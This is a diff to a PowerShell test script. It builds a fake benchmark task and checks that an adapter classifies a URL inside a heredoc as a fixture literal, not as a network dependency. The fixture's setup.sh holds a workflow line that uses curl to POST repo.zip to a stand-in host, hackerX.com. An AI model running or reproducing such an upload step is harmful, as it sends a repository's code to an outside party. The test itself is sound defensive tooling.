@@ -123,6 +123,28 @@ Assert-True ([string]$localServiceAssets[0].asset_kind -eq "local_service_endpoi
 Assert-True (-not [bool]$localServiceAssets[0].required_for_e3) "localhost validator URL should not require external asset proof"
 Assert-True (-not [bool]$localServiceScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "localhost validator URL should not downgrade E3"
 
+$heredocFixtureTask = Join-Path $runDir "heredoc-fixture-url"
+New-Item -ItemType Directory -Path $heredocFixtureTask | Out-Null
+@'
+instruction: "Remove the suspicious workflow upload."
+category: software-engineering
+'@ | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "task.yaml") -Encoding UTF8
+"FROM scratch" | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "Dockerfile") -Encoding UTF8
+@'
+cat > deploy.yml << 'EOF'
+run: curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
+EOF
+'@ | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "setup.sh") -Encoding UTF8
+"echo ok" | Set-Content -LiteralPath (Join-Path $heredocFixtureTask "run-tests.sh") -Encoding UTF8
+$heredocFixtureOutput = & (Join-Path $PSScriptRoot "adapters\terminal-bench-adapter.ps1") -TaskDir $heredocFixtureTask -OutputRoot (Join-Path $runDir "heredoc-fixture-out") -SampleId "heredoc-fixture" -SourceVersion "pinned"
+$heredocFixtureScenarioDir = [string]($heredocFixtureOutput | Select-Object -Last 1 | ForEach-Object { $_.scenario_dir })
+$heredocFixtureScenario = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $heredocFixtureScenarioDir "scenario.json") | ConvertFrom-Json
+$heredocFixtureAssets = @($heredocFixtureScenario.external_benchmark.adapter_metadata.remote_assets)
+Assert-True ($heredocFixtureAssets.Count -eq 1) "heredoc fixture URL was not recorded for audit"
+Assert-True ([string]$heredocFixtureAssets[0].asset_kind -eq "fixture_literal_endpoint") "heredoc fixture URL was misclassified as runtime network"
+Assert-True (-not [bool]$heredocFixtureAssets[0].required_for_e3) "heredoc fixture URL should not require external asset proof"
+Assert-True (-not [bool]$heredocFixtureScenario.external_benchmark.adapter_metadata.e3_downgraded_until_remote_assets_proven) "heredoc fixture URL should not downgrade E3"
+
 $dockerUvTask = Join-Path $runDir "docker-uv"
 New-Item -ItemType Directory -Path $dockerUvTask | Out-Null
 @'
